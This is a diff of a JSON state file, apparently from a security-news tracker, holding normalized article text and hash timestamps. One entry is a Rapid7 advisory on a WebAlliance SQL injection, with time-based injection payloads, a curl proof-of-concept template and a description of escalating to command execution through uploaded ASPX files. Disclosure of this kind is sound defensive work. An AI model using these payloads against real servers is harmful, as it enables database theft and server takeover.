upgrading does not remove filter rules already saved accounts administrators should inspect stored incoming outgoing filter rules external span span style color rgb 24 128 56 font size undefined span actionnotify span span span style font size undefined rfc compliant notify actions violate forwarding policy modern s filters view not sufficient this review span p h2 style direction ltr detection incident response h2 p style direction ltr span style font size undefined reverse proxy web application firewall inspects request bodies can detect multiple span span style color rgb 24 128 56 font size undefined span authenticate span span span style font size undefined aliases one anonymous graphql request zimbra s ews logs expose cross user operations involving two different account uuids shown span href style font size undefined ews iocs span span style font size undefined saved notify rules outbound notification traffic provide more direct evidence sieve path span p p style direction ltr span style font size undefined ews creates no delegation grant revoke sieve rules remain saved account state sender impersonation can generate ordinary sent mta artifacts recovery must cover those server side changes any other mailbox reached not only password account first compromised span p h2 style direction ltr credit h2 p style direction ltr span style font size undefined assessment conducted jonah burgess span href style font size undefined cryptocat span span style font size undefined senior security researcher rapid7 accordance rapid7 s span href style font size undefined vulnerability disclosure policy span span style font size undefined span p h2 style direction ltr disclosure timeline h2 ul li style direction ltr p style direction ltr span style font size undefined strong april 17 2026 strong span span style font size undefined rapid7 submitted initial report covering 23 findings span p li li style direction ltr p style direction ltr span style font size undefined strong april 24 2026 strong span span style font size undefined zimbra acknowledged report span p li li style direction ltr p style direction ltr span style font size undefined strong may 21 2026 strong span span style font size undefined zimbra confirmed they validated 10 23 findings three which duplicates span p li li style direction ltr p style direction ltr span style font size undefined strong may 28 2026 strong span span style font size undefined zcs 10 1 17 fixed cve 2026 73571 span p li li style direction ltr p style direction ltr span style font size undefined strong june 1 2026 strong span span style font size undefined zimbra requested embargo publication until planned zcs 10 1 18 release september span p li li style direction ltr p style direction ltr span style font size undefined strong june 16 july 7 2026 strong span span style font size undefined zcs 10 1 18 10 1 19 released without additional fixes initial report span p li li style direction ltr p style direction ltr span style font size undefined strong july 15 2026 strong span span style font size undefined zimbra rapid7 agreed september 24 coordinated disclosure date span p li li style direction ltr p style direction ltr span style font size undefined strong july 20 2026 strong span span style font size undefined zcs 10 1 20 fixed three additional cve assigned findings initial report cve 2026 50054 cve 2026 10631 cve 2026 50055 span p li li style direction ltr p style direction ltr span style font size undefined strong august 19 2026 strong span span style font size undefined rapid7 submitted second report containing 32 additional findings span p li li style direction ltr p style direction ltr span style font size undefined strong august 31 2026 strong span span style font size undefined rapid7 zimbra met prioritize remediation discuss patch verification span p li li style direction ltr p style direction ltr span style font size undefined strong september 8 2026 strong span span style font size undefined rapid7 submitted third report containing 25 lower priority findings span p li li style direction ltr p style direction ltr span style font size undefined strong september 17 18 2026 strong span span style font size undefined zimbra requested 90 days receipt later report before publication full technical details rapid7 scheduled those later findings november 23 span p li li style direction ltr p style direction ltr span style font size undefined strong september 24 2026 strong span span style font size undefined zcs 10 1 21 fixed four findings second report rapid7 presented selected results attack chains brucon without releasing associated weaponized pocs span p li ul",
+      "ts": 1792012975.3480847
+    },
+    {
+      "norm": "cisa warns admins immediately fix ivanti flaw exploited zero day u s cybersecurity infrastructure security agency cisa urged security teams immediately patch ivanti connect secure ics flaw exploited zero day attacks since least october 1st",
+      "ts": 1792012975.3480883
+    },
+    {
+      "norm": "unauthenticated sql injection channel software weballiance ecommerce h2 style direction ltr overview h2 p style direction ltr span style font size undefined while performing continuous red teaming exercises through rapid7 s vector command service rapid7 discovered span href style font size undefined cve 2026 108065 span span style font size undefined sql injection vulnerability cwe 89 channel software weballiance ecommerce exploit allows malicious actor read sensitive data database if database user high privileges run system commands database server vulnerability scored span href style font size undefined cvssv3 1 9 8 span span style font size undefined critical span p h2 style direction ltr product description h2 p style direction ltr href style font size undefined weballiance ecommerce span span style font size undefined channel software all one b2b e commerce digital catalog customer portal platform purpose built wholesale distributors industrial manufacturers span p h2 style direction ltr impact h2 p style direction ltr span style font size undefined sql injection exploit can leveraged view sensitive information database such user pii passwords if logged db admin privileges vulnerability can exploited run system commands server running database span p h2 style direction ltr credit h2 p style direction ltr span style font size undefined this vulnerability discovered marcus chang security consultant rapid7 being disclosed accordance span href style font size undefined rapid7 s vulnerability disclosure policy span span style font size undefined span p h2 style direction ltr cve 2026 108065 unauthenticated sql injection h2 h3 style direction ltr span style color rgb 67 67 67 technical details span span style color rgb 67 67 67 strong strong span h3 p style direction ltr span style color rgb 31 31 31 font size undefined rapid7 exploited vulnerability during blackbox testing unable perform root cause analysis suserid parameter getuser method soap request span span style color rgb 24 128 56 font size undefined preapproval asmx span span style color rgb 31 31 31 font size undefined doesn t properly escape user supplied suserid sql query can escaped inserting single quote parameter database running microsoft sql server which allows stacked queries query can escaped inject completely sql commands span p pre post preapproval asmx http 2 host target site user agent mozilla 5 0 windows nt 10 0 win64 x64 rv 152 0 gecko 20100101 firefox 152 0 accept text html application xhtml xml application xml q 0 9 q 0 8 soapaction content type text xml charset utf 8 content length 377 soapenv envelope xmlns soapenv xmlns tem soapenv header soapenv body tem getuser type string tem suserid 90 inject mssql statement here tem suserid tem getuser soapenv body soapenv envelope pre p p p span style color rgb 31 31 31 font size undefined if single quote inserted sql server fail parse query return syntax error http response span p pre http 2 200 ok cache control private max age 0 content type text xml charset utf 8 server microsoft iis 10 0 x frame options sameorigin p3p cp potato date date content length 440 xml version 1 0 encoding utf 8 soap envelope xmlns soap xmlns xsi xmlns xsd xmlns getcustomerresult incorrect syntax near zzz unclosed quotation mark after character string getcustomerresult getcustomerresponse soap body soap envelope pre p br span style color rgb 31 31 31 font size undefined information can extracted using time based sql injection payloads example query can injected force database sleep 2 seconds if database user sysadmin span p pre post preapproval asmx http 2 host target site user agent mozilla 5 0 windows nt 10 0 win64 x64 rv 152 0 gecko 20100101 firefox 152 0 accept text html application xhtml xml application xml q 0 9 q 0 8 soapaction content type text xml charset utf 8 content length 377 soapenv envelope xmlns soapenv xmlns tem soapenv header soapenv body tem getuser type string tem suserid 90 if srvrolemember sysadmin 1 waitfor delay 00 00 02 tem suserid tem getuser soapenv body soapenv envelope pre p br span style color rgb 31 31 31 font size undefined if database user sysadmin sql ole automation can used upload file span p figure style margin 0 img alt cswa sql1 png class embedded asset src style text align center width auto type asset figure figure style margin 0 img alt cswa sql2 png class embedded asset src style text align center width auto type asset figure p p p span style color rgb 31 31 31 font size undefined if database running same server web application aspx files can uploaded they can then browsed run their code perform system commands server span p figure style margin 0 img alt cswa sql3 png class embedded asset src style text align center width auto type asset figure p p h3 style direction ltr span style color rgb 31 31 31 proof concept poc example span h3 p p p style direction ltr span style color rgb 31 31 31 font size undefined strong curl poc strong span p pre curl path i s k x post h user agent mozilla 5 0 windows nt 10 0 win64 x64 rv 151 0 gecko 20100101 firefox 151 0 h accept text html application xhtml xml application xml q 0 9 q 0 8 h soapaction h content type text xml charset utf 8 data binary soapenv envelope xmlns soapenv xmlns tem soapenv header x0d x0a soapenv body x0d x0a tem getcustomer x0d x0a type string x0d x0a tem scustid 90 your sql statement here tem scustid x0d x0a tem getcustomer x0d x0a soapenv body x0d x0a soapenv envelope style color rgb 67 67 67 remediation span h2 p style direction ltr span style font size undefined block access span span style color rgb 24 128 56 font size undefined preapproval asmx span span style font size undefined span p h2 disclosure timeline h2 ul li style direction ltr p style direction ltr span style font size undefined strong july 13 2026 strong span span style font size undefined issue discovered marcus chang exploitation reported vector command customer span p li li style direction ltr p style direction ltr span style font size undefined strong august 28 2026 strong span span style font size undefined initial contact channel software span p li li style direction ltr p style direction ltr span style font size undefined strong september 8 15 29 2026 strong span span style font size undefined follow up email sent channel software confirm initial contact provide details correct channel share details vulnerability span p li li style direction ltr p style direction ltr span style font size undefined strong october 9 2026 strong span span style font size undefined follow up email sent channel software informing them public disclosure october 14 assignment cve along request vendor statement rapid7 received no response channel software span p li li style direction ltr p style direction ltr span style font size undefined strong october 14 2026 strong span span style font size undefined em em span span style font size undefined public disclosure via publication this blog post span p li ul",
+      "ts": 1792012975.348092
+    },
+    {
+      "norm": "cisa urges immediate ivanti connect secure updates honeypots log 105 exploit attempts u s cybersecurity infrastructure security agency cisa tuesday urged organizations take steps immediately update their ivanti connect secure ics appliances deployments latest version following disclosure actively exploited vulnerability security flaw tracked cve 2026 104935 cvss score 8 6 case authentication bypass impacting ics",
+      "ts": 1792012975.3480973
     }
   ],
   "seen": {
@@ -2462,6 +2454,7 @@
     "035001ca0c44dea3800078467e62dcdfd2735bcd": 1791816354.7004743,
     "04183963b9d8e8822fd6f1495d95c2716c6e5a15": 1791633972.854412,
     "0419de820a0c85c8e81b0303bfa70a2bf38767a2": 1791584691.2505016,
+    "045289937798f189898d9d5bcbf5a72176a09f51": 1792012975.3479958,
     "04ab1973266f34142dc8331ca220286d7b21d2ff": 1791930270.399704,
     "04cd634844344647bfa6fb9dab2041ad464ca6c3": 1791584691.250527,
     "04e7535e61e612e78ea250399339944f742d819c": 1791754705.899662,
@@ -2485,7 +2478,6 @@
     "0bb24fdc38bc95ed701123218bcd927004af1e37": 1791464497.9204834,
     "0c34834f51359083617f8c1a4e915fa05ad5280b": 1791667134.0954275,
     "0cfb790894cf8cc47c246991bbd291fb6935cb71": 1791977131.3662689,
-    "0e094bbf1db293f554eccd25bd1f889617e9a97b": 1791377589.3032606,
     "0e1aec287d5b44f93026460488aa827454fd8ec6": 1791464497.9204302,
     "0e8c653d006415ac2969306a17aa20f52af8fad3": 1791977131.366305,
     "0f625bcdfa97d28044241e77304b9303ca7cadbb": 1791721188.475936,
@@ -2499,7 +2491,6 @@
     "120d43c94eeed2cb4f679ee7dd7579785d411192": 1791930270.3997874,
     "1264e65f980bae9e9446584844d486f16b59e153": 1791464497.9205208,
     "128ef325e330dc610ee4072a867afa3c74801c94": 1791816354.7003987,
-    "12e41dfb9e1f564b52b5ec1e86db45db5b83fffe": 1791377589.3031728,
     "132069b85b8fd69723de65ffad33b2c60985ea10": 1791754705.8996916,
     "1343fb03b0033931aec269efc19192ae673646d0": 1791754705.8996997,
     "137dca12c53f6b24856bf4d147ad93e5ce931b8f": 1791633972.8543744,
@@ -2508,20 +2499,17 @@
     "144f472a1e641422a2467e25f0c9c6dc0f142550": 1791977131.3662388,
     "14c8d290762cda2b6cc8028a072fd828221d3fb9": 1791977131.3661377,
     "1572cfbc8e6865930f7ff344cc00dc3ece01ff00": 1791667134.0953915,
-    "15d8931249241012cd4db75027f84225f923bc8f": 1791377589.3032897,
     "1608d9df78e7886b4f093bae1100e9f5ea0a9b45": 1791899284.1255674,
     "1728782a1e6c5132f53c7c3e384e51b4257b1d00": 1791930270.3997574,
     "172b933e4740eecac7c84ea5d3c422d5a7afc4cd": 1791816354.7004173,
     "175a7df5c5ccb15a1c29c521d08ce1ea120b8f40": 1791816354.7003903,
     "176337226fdb1c104dece9b3945f0adf181c1eab": 1791667134.0953398,
     "1781a19fe7ce0212242b61a2d896aa51100aa4bf": 1791721181.1142461,
-    "17d59a0b3ea91ff3fb96234de4e1c4d55eee23c2": 1791377589.3032374,
     "181d174bbac468dbca26aca55228c9b19a773a4d": 1791977131.3659146,
     "1838c6d3bcfb013c32480fc2da191030e8f31d25": 1791550080.846373,
     "188f4daf5827c55676d84b6d0a4cd9f60f702222": 1791633972.8544035,
     "18bf141d2661557ca190612f030aeca98ea90a13": 1791667134.0954227,
     "18c9215142f8bc9bcdf10065b9b191e058b6ad5a": 1791584691.2504988,
-    "1958c70e74f7f28ad7e54922ebe0204b88933337": 1791377589.3032477,
     "19a292ee37839cafa247943eb92256b7b550dad5": 1791977131.366299,
     "1a0763123a1d11fad123c60f44a7dcd9f3e5d0a8": 1791930270.3996787,
     "1a9fdc2dc47360c86b9a6ae0c27051321f604e51": 1791899284.125424,
@@ -2537,16 +2525,15 @@
     "20b164c89d6db3ada807e9714616ef1bf89cd510": 1791550080.846245,
     "2160c75afbc6c263c3dece1dc045bdb3ee1cc47c": 1791464497.9204876,
     "21816e632b645b53511a9a1b7c55e28482397a3f": 1791977131.3662922,
-    "21989a434fca5f18f565da541888fc85163fcd35": 1791377589.3032424,
     "21d2d20460691dcd7c1d56c8efb3b27a7cfaf37d": 1791584691.2505467,
     "21edffe120823d4e0b6a6ef122f8139677e89327": 1791930270.3997,
     "228d77dd510f2f86b35414300600a0a72682a30b": 1791550080.8463132,
     "22c6ef693aeebfce960b14687d6e683965a8a918": 1791930270.3997285,
     "22e67f78de18053e597e94db7e6ab0c5d46602e5": 1791930270.3998168,
-    "2322918b8aa6967a3f5a404d6a1406f1cd7ee902": 1791377589.3031967,
     "23373acbfb83777a06d7b263de2db792f7bafc56": 1791977131.366103,
     "233ec4004daf4cede73908b93fadaa5851cc0c80": 1791550080.8463767,
     "2497e5f6d5d21143ddedfd1e770b74f902e9ff64": 1791721188.475863,
+    "24b402916fcefe4051f1c975aeca6c83bf137d82": 1792012975.3479679,
     "250a0b74db7d26da7e35d8832c74a3cf35757d6e": 1791721188.4758298,
     "2524f939ba20df882a48fe55d54d2957fdd5e3f9": 1791816354.7004888,
     "25eba9efae3f24d2fb06df4731b4d8113b882462": 1791633972.8543646,
@@ -2556,7 +2543,6 @@
     "268e8c7bbe39b42ca980f3835d70109f70c656cb": 1791667134.0953941,
     "26a56507df549a3aeb0cbf390dc00fac4bd4ad57": 1791500651.6664414,
     "2735ba7149f5684227923a9ce6a8923b09d81d46": 1791754705.8996458,
-    "27c8334a61d52f2b51d3fac5a963f499d5850da7": 1791377589.3032155,
     "27f9aa87c0d8ce47206e8c07246057cec85bd082": 1791850683.8328438,
     "285e5e3adefd95da7e27ff2731d0a0708e78a194": 1791667134.0953562,
     "28da8c245f5dca446098043dbd32b3762bb4166e": 1791850683.8328502,
@@ -2578,12 +2564,10 @@
     "2ce4fb4e00ced6defc27ec00c193d2e3cdf11b67": 1791584691.25053,
     "2cf131532cb914f15cdedf76c8a95926fa537f52": 1791977131.3659232,
     "2d9bc4bcaef935ece51c1ef2825be628de005c84": 1791413559.4087386,
-    "2d9c395cb16476831010f5d7874c4788f5c678cc": 1791377589.3031938,
     "2dd9410fd458703d02407fba41b944a21920899a": 1791721188.4759896,
-    "2de79823b5455a836924b34a968ca8bfa9f5fcfb": 1791377589.3031764,
     "2dead0e4779db850b5c0a9b5938f298356ee678d": 1791721188.475956,
-    "2e1e15e83be51d6e25412ee47164a644086e7c37": 1791377589.3031695,
     "2e60222f3f0a45ebbb31264125da88b510f6763a": 1791413559.408652,
+    "2ee0c0a49b5a2657a0b5c4685b6a56597674195a": 1792012975.34805,
     "2f52b27c8c9419304c93712577f0b3ec47e7e76f": 1791633972.8544376,
     "2fd581d2b9b4e293783f76ae17a90fcf9345199f": 1791930270.3998048,
     "3022a6138a862b67a9566d91d8083069982072f3": 1791413559.408625,
@@ -2591,10 +2575,10 @@
     "305b75f77000369d08de597d74ee08fa0737629f": 1791500651.66638,
     "30c48aec6fa791e331300a9d1455f0e6b66a3b14": 1791930270.3997333,
     "313976c425033f79840ac4b80d2012714726d105": 1791550080.8463328,
+    "319aa986d3e5a772ed3f063f48073bddaf0dcfbb": 1792012975.3480742,
     "32035cdf444db9d3779b3f3a58f6aab2cd381431": 1791550080.846321,
     "326585447eb608309bd0cc903f57fee9a510e594": 1791500651.6664612,
     "32a5798850bf21a4917374d97ea10ac5ab523dfe": 1791899284.12546,
-    "32c92579d2d8bd6c99d29c7d57e000d5f90c1294": 1791377589.303256,
     "339f93492eeffe921a65315848f66e7b92194200": 1791899284.1255622,
     "34a5b95f7f1bd670bc5d0fe27c629b96099dfd3e": 1791550080.8463173,
     "34f9e6caf0ef2bdf880f23cd0d4f10b70d0e80d6": 1791816354.7004304,
@@ -2634,7 +2618,6 @@
     "43aaadeab2e03e4ff1608a8b78212b277b4daa35": 1791721188.4758587,
     "43d8a91bc2a7ef236d41a506f73d27fc3e41dbf4": 1791584691.2504728,
     "43e07010e36bff2471adf3228db5da14b018b262": 1791464497.920507,
-    "445432276ec5fcecea734a2587668713bde9ac8e": 1791377589.303222,
     "4512f2043b78391aa35fc5be9ae0879d88847f80": 1791500651.6664684,
     "4528bc371e4a409676400d5297735202b5bc6c9a": 1791500651.6664,
     "4561eea13d9a7297aa056c3251455ec274a2bd5b": 1791500651.6664915,
@@ -2643,7 +2626,6 @@
     "471ea8bf94e66bbd6c9c8820b9baf983a9f0e45f": 1791754705.8995974,
     "476b0edf51f784e701233d84e106fd2aab9eb43a": 1791500651.666382,
     "4878496c92ee9b673014961fc92ec89675885566": 1791550080.8463845,
-    "49b14ed2d5b24797c8eadf69c7c36fe093c062a7": 1791377589.3031454,
     "4bb3f6c5d47ec2cedd9c6f08e4dc4b322f8d9c48": 1791850683.8328626,
     "4c28b0c9be31eae90942286d6551b52c623feac4": 1791754705.8995664,
     "4c4cb6380811cfc65a4c958f2c2f6164eed5af41": 1791667134.095408,
@@ -2652,12 +2634,13 @@
     "4cf4da020059176cb57d170452b2d4e27175ceb0": 1791754705.8996592,
     "4d0ab1e7dd5973407505c68437b8c46024786737": 1791413552.735208,
     "4d43b6c7b064be1335cb42b43eb3ef26370a6ecc": 1791633972.854421,
+    "4d5b36d13b300c3b0d8b544940b993f46b07c6dc": 1792012975.3480034,
     "4dc2fbb89eb1359191cdb290d356660bef3ea799": 1791899284.1255503,
     "4dcee3405abaea428f66ff79eaf710600fe0d027": 1791850683.8328302,
     "4dee64c03bb74bfe264099aba3f7ef5d84abc9f6": 1791899284.1254761,
     "4e716b804a63e6f8512ff63b06b361fe36a73de9": 1791899284.1255865,
     "4e863af2bcacd13dc8fd9471f1b316eb1e725bf1": 1791721188.4758713,
-    "4e888681b7b481dbb4acfb6d27c210cefebd030c": 1791377589.3032858,
+    "4ec11149b02ca77dd707d494d3cc807654e30e18": 1792012975.348054,
     "4f95732c4969a2353a318bf6c6580f7079301dd7": 1791633972.854313,
     "4fa305b5240d7d37f2a39688ad9ee6414b36fd61": 1791584691.2505329,
     "4ff5bacfda6803a0e01bd71cb31e7395186c54aa": 1791464497.9204974,
@@ -2673,20 +2656,16 @@
     "5536db95e16ab920fe387164ee0f7164ce227b58": 1791977131.3660147,
     "55445c135805d266e4de7758498952d4a931978e": 1791413559.4087017,
     "55864660cd86f4ba13ebee5a6421e4cc36e54195": 1791584691.250518,
-    "55d800a6f1de324b0cde27612dd9cc296b03463b": 1791377589.3032312,
     "55f0ecdd0bfd17843174592370fde17f613d47c6": 1791633972.8543582,
     "56700f399dd97d1fb8e58efd09a746f99b929316": 1791633972.854471,
-    "571c2ab48e10bf299ae057aba133d32601f51c4b": 1791377589.303274,
     "57cc9f4b5f83babdb3441ecc21ab45adeea6c2c2": 1791667134.095367,
     "57d7ee05b83fd99b83a2b542f9deff0faf7ff559": 1791899284.1255813,
     "585594f86cc881b7f666cf835f95f6dbea46c6f9": 1791899284.1255755,
-    "585a38591fc09e557f6f3ddef3187f099699c944": 1791377589.3032045,
     "59130545c940eaeb84052e6ae0c09cb254fa27b5": 1791584691.250544,
     "597dc1488663d6c1c77cf7cead5b859c037dc2f5": 1791500651.6664448,
     "59c32e659383e602340ff380724b516846fb647e": 1791464497.9205182,
     "5a70d1e6bd473ee48959e75a5f8304c65d552cc6": 1791899284.1254725,
     "5ae29bf7b51ae6e43f9c0d2fb5d8197248f68522": 1791850683.8328567,
-    "5b5e36783f9e6da42821a8bed748b87a07898cf5": 1791377589.303228,
     "5bce29cf9ae1d537ae04a14dcdc2b0f4564ae14d": 1791754705.8996954,
     "5c6b4229a7a44b22dfe5f0e48c9af33b8d64894b": 1791550080.8462973,
     "5d21e50f10d37cc855a63a9138b611655670f868": 1791584691.2504783,
@@ -2697,15 +2676,14 @@
     "5e7190318dbce36521fc7777e75ae8d6a23d8e39": 1791667134.0954325,
     "5ffff8d173ed3cf746614e4b26c598ee2585ae80": 1791816354.7003863,
     "604124be3b4aa73775d51100cdd271582c6953d9": 1791899284.125589,
+    "6051d8ed862c2daf34ecd90086dfa2965ce5d68f": 1792012975.3479838,
     "60741e2fa63608cb9f523b6ae40be04fde311c70": 1791899284.1255565,
     "61395f90aa8ad1f74ccf30a490057d94f154d3b3": 1791850683.832841,
-    "61acdfc939132f1c3c623884146f159422937770": 1791377589.303165,
-    "622457ee914ad29a8993539858a6c060af01a0a8": 1791377589.3033018,
     "6281ee2fcd9ff18a17101385c6c2f30efa7f123f": 1791721188.475948,
     "62bfd0328c85a41fcb0c1b03349b0e7c7f8c2cd1": 1791413559.408754,
     "62f727b9ef19525cc476e256286c905219b69c9e": 1791721188.4759524,
     "636f592f9fe4d1f69c86b3029a2757bf6575db97": 1791930270.3997664,
-    "637cde09cef7b1c1cf7c79e7e01ec6904ff723da": 1791377589.303188,
+    "639d0d6e00a7eca3d11d5db60af7d3290bccdcaa": 1792012975.3479784,
     "63a609a6b1c05dde3328d0209ab173c68dc0f9e3": 1791667134.0953321,
     "63be913fbf5f29417b88033318c642f878e0cc5b": 1791500651.666387,
     "63d6d101ab6d43606bbab6e3a5eb767d75134938": 1791667134.0953977,
@@ -2723,13 +2701,13 @@
     "683a4faea513f649c46681d523d6d1c4907e97a8": 1791550080.8463368,
     "6877a62a0bf960dd7cbbabaea903c2f944188e40": 1791464497.9205317,
     "68a294ba84361fd97c6ffd43014c873efeef81c5": 1791930270.3998117,
-    "69027c2a225c9a5a321e227c062c6201476a7bdd": 1791377589.3032188,
     "692ee407bfd06c50e55d029d7df1c02cc477aef9": 1791667134.095465,
     "6a96d5d7e3a89ef1bf65b168b7b017b6893d5d4d": 1791500651.6664095,
     "6ace8d2133e05834ebc6998ba7071f1eab846b0a": 1791550080.846264,
     "6ad8a15b4ab56f6e845423bff847a220287519d6": 1791413559.408692,
     "6b624d7c6c2e0e4a47056c75dbe0d57ba94fce03": 1791721188.47581,
     "6b9c4b3e9dc911f9c52f61e7d2b8530622fd2662": 1791633972.8544164,
+    "6bb19fd6562cc725ef8f98a0c501c4816af92dfb": 1792012975.348021,
     "6bfc27d05d215d21b74ca6ff4e1b892637140a6c": 1791464497.9204512,
     "6c8407df0b36380043e86aac926b70a121e25ae6": 1791899284.1254895,
     "6c920079ad829cda3cc338c772d7c0483e5d93ca": 1791850683.8328662,
@@ -2750,33 +2728,38 @@
     "73645a02bd8347192206b82a416447504d2285cd": 1791667134.0954783,
     "7371db805c68e0f1d4ff76522134c36a59dac153": 1791850683.8328536,
     "741bf79fb2c829d0eec6cc8de47e3d2dde9e908a": 1791721188.4758897,
-    "7545dfb137e3b00ed068a285c6640c050fe53cad": 1791377589.303201,
     "766883a4aa1f384a116411a1c459b29423dd5aa4": 1791584691.2505412,
     "777d177ab8f0a0c4d18a2137393f6b12805b82b7": 1791850683.8328724,
+    "78394b2e6b36c2856a85b2231c39ddee2611e7f0": 1792012975.3480248,
     "787e17da78c4227cfdf86a99c0618b63c48947a9": 1791550080.8462932,
     "78933c4fe15e5dcdfc15588144d6c018bd118e66": 1791930270.3997083,
+    "78b0d9b2dfa117c3a73cc06145b37d273d7ebbc4": 1792012975.3479903,
     "78b8968a5e91d42b8cdd331b3ddc433fe81d8a3c": 1791500651.6664846,
-    "78d1d9b56302a600e02cb33a3b485cee5aec6800": 1791377589.303182,
     "79446cd89775d8149e818ccb027b89a781be02b8": 1791977131.366287,
     "79976e0ae4389a3c5a16c09aa85535e3a05ab787": 1791413559.4086485,
     "79a8a7bd139829526fce12afae717f3bb660d110": 1791413559.4086173,
     "79e897c47e9dbb7f2389b63cd0849329f8036a3c": 1791754705.899669,
+    "7a224cbe0db0b27581a48920036b72b191b94309": 1792012975.3480144,
     "7a7f58a87f0e99e794fc42fca1e2ffffc2bf0ae1": 1791584691.2504578,
     "7a7fbf93e11c89abc6fabfd8f7e6507e34e66f55": 1791816354.7003691,
     "7a914e084e89304d31db23e56dcc2a8ce3aae22b": 1791500651.6664124,
     "7abea8917c3cef0d739406154ead69e4f82546ad": 1791930270.3996396,
     "7be825a80966799c4a5d026f3820d7025bcb1bfa": 1791816354.7004256,
+    "7bf6f5bbc65c05af2dbc7d4738e6aa279c64226a": 1792012975.3480306,
+    "7ce538eab969da7b625abd46cba277aeba6818f2": 1792012975.3480418,
     "7cfe6f2113f91571a60ab40201f4d6174859d683": 1791721188.475876,
     "7d292d009c92a6ea66f9375a9638b53b49d9d936": 1791850683.832897,
     "7d6f890d8bce58ca410670477b07b5a49753177f": 1791633972.8543992,
+    "7da1d8e11993ee03726ad18d734bb089e35a9d96": 1792012975.3480814,
     "7e597d648c37a81c32d8425d05410c465d93c2f6": 1791850683.832875,
     "7eecf551fade765e01cf73aae99f32029f860a13": 1791754699.8520613,
+    "7f55a7a9001ea1149f3907b8e4a32941a2026bb1": 1792012975.3479621,
     "7f5dd566b2dd8d8cd689f202d357bb36a03a2891": 1791633972.854341,
     "7ff5ebdf54049fd1f5d5e7fa998ca6f9adcd0506": 1791667134.0953696,
     "814f3d74af5f35a37c025cf7d121c2bfb3dcc522": 1791550080.8463695,
     "815b7a94646fc6cbd9272c3a853ec637d554b84e": 1791816354.700479,
     "8187d0f2ac60bf6f6560ef4d27402a712c1a7e2e": 1791930270.399724,
-    "81fd39919faac501570b66371e80b156c3d76c65": 1791377589.303282,
+    "835a57efab96f42461e390e9cf176a2ead93ddde": 1792012975.3480883,
     "83ad8032898d3c18b8987fbfdc221fcd9fb3dc84": 1791899284.125507,
     "83b16840c46867928788d73aeb995882224a62e4": 1791816354.7004836,
     "83d130e7ba9f7dd16780b5aa051506c65599588d": 1791977131.3662632,
@@ -2790,7 +2773,6 @@
     "85bfd7cabc50bb4c1de0fde1c6f38bd271705904": 1791413559.408713,
     "860b133503de078c6f24f052b116e94273f94aa4": 1791413559.4087503,
     "861f4dd4c580966a80c1122d9ffeb9b61acc3973": 1791754705.8996007,
-    "865c5e5320aac263306391f83bcf595beb650f72": 1791377589.3032649,
     "86c0c05804fff5d52d64c7f6789a7a759ee3f053": 1791464497.9204063,
     "86eb1307cd1f7661e1c1316cbed2a57f727c591b": 1791977131.3662753,
     "872f31f1652880ce4de4eb7cb2c11b6887a156a4": 1791930270.3997471,
@@ -2804,6 +2786,7 @@
     "89da19b51c108909add2bf9e27d94a365cc55903": 1791977127.7276387,
     "8a40d60c172836034aef6b225a03606ba14c551f": 1791721188.475986,
     "8a453e671d33dab4354bade8a75315f2e4e45263": 1791754705.8997157,
+    "8ab3c51ec37145657c09b41052a3a315adff42cb": 1792012975.3479648,
     "8aec78183befadf7ded785a310f4d8993a69d0d1": 1791899284.1255841,
     "8ba0ac282b9f068bb1ae56a144b2e925363bd716": 1791721188.4759068,
     "8ba9b8e7a12a6c3d7f6fc2256983a46f5e00bc58": 1791850683.8328378,
@@ -2818,12 +2801,18 @@
     "90f714cac7b33a2d10ce141508c50158a7b0080d": 1791500651.6664023,
     "90f8d938cf4bba502e92a5b83553a5751bebad73": 1791584691.2505214,
     "90f9f91df025e5c71c18185f5ea9544050b3e527": 1791464497.9205241,
+    "91795601b1ffd249b1f5b2d62d6d91ad19f21d7d": 1792012975.3480585,
+    "91d989b5fb66289f25dcd19101e48e7c41a9462b": 1792012975.347973,
     "91e45ba5d38f226c5d98cc44358ea72b092a0a3d": 1791754705.8996243,
     "9240177894aaf87facabf8173802807aa53e8ab9": 1791816354.7005253,
     "924aea9ba32e518f4b392d5ee9e846fb655cb3a4": 1791584691.2504616,
     "92a0130480ed5d9cd733dfc757f40b1254497d75": 1791550080.8463914,
+    "937c7f4fab21f49cf5a0f9830e26487a2a078282": 1792012975.348038,
     "93fdc1c1f20c2d800097b36662b2b9c531f9eaa7": 1791754705.8997078,
     "9500df075a9b45c20ed054106945e659fd708de8": 1791633972.8544927,
+    "96569fe71628d69f4bf7196d0a86103ddf80f83c": 1792012975.348092,
+    "97663ac4d05ec1873d2ab237a1514705528b60b0": 1792012975.34807,
+    "976f4f5fb239546a1517e32db6d8451af1e92a48": 1792012975.3479705,
     "984f7e86d7197d0e52ea1800c7ddac9b7dec00db": 1791633972.8544416,
     "986b76c74d972a9dd187047eb5ff30cd1f03f7a4": 1791721188.4758937,
     "986e0b7b7db00c83152e756d62271fdeea937b43": 1791930270.3998141,
@@ -2842,8 +2831,6 @@
     "9df69a99acf9c9d868a6c44829d491b5d6466ad9": 1791413559.4086394,
     "9eea57edb89b54636f2899fac15a9de383674e26": 1791850683.8329039,
     "9eef291b01269e916c0604c8ed31542ad6759a1e": 1791899284.125455,
-    "9f1a8977892018e92868669c6ec02440bf608392": 1791377589.3031793,
-    "9f73fae79456b9a97bb49ddcc57a903ac7590590": 1791377589.303294,
     "a04d7b79eec952c4dd4fd063b93b46b4e4df5ee3": 1791584691.2505634,
     "a059a537c8eec3568b9c34dea81ef7528d9654fb": 1791550080.8463807,
     "a08438a7ab1a57d46e6adeff721c344869aaff10": 1791721188.475881,
@@ -2852,26 +2839,27 @@
     "a107c9394b7b5ab57a2a4981798c42c09fb080e6": 1791584691.250504,
     "a125a4e237a45a6216d411b3165ffb3ee7ca493f": 1791550080.8463047,
     "a1b83b422572aeb6849cac33565987e1bb0fa7ec": 1791550080.8462596,
+    "a1e5b1dc00e9e35a004429833aa776e247e0f4c5": 1792012975.348066,
     "a204ec496342f82364c4c80c804c4d7d0ec0df05": 1791464497.9205034,
     "a235d02d46e2e2aa45d21ebcf4aa483040105e42": 1791754705.8996184,
     "a240599f4fed05f6d19af97d86ed5878632030ef": 1791930270.3996923,
     "a24af62903adae24a8df1e704ac187ab2a47de21": 1791930270.3996868,
     "a2c6481b2f81eb3622407cae6d3c21227f1758ca": 1791633967.1336958,
-    "a3797a0ae4c4d1e515c54b03a365c6e354b97c1f": 1791377589.303234,
+    "a2de7043bd5e42261a0a63dd1ae3a3e238323356": 1792012975.3480847,
     "a3c8b5faaaa961b34ccb122e3d943b9495f8c51e": 1791754705.8996875,
     "a5918bcef09472b991d9c753fd9181f452d34cb3": 1791754705.8996084,
     "a5bbf00b7be40629a8dcb9ef4c9fcf3cb2a8a70d": 1791464497.9205291,
